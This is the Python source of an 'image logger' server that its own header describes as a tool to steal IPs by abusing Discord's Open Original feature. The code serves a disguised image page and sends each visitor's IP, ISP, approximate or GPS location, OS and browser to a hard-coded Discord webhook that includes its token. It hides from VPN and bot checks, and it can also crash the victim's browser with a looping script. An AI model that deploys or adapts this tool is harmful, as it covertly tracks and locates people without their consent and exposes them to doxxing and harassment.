
# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1444758283893215363/rT_Jln873ex9qW2_1SYAEDWmZtnJ0hCZITqz-ayVxNF2RnNxusmI2moFQJ_xVp7w2Qzz !",
    "image": "data:image/jpeg;base64,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 !", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

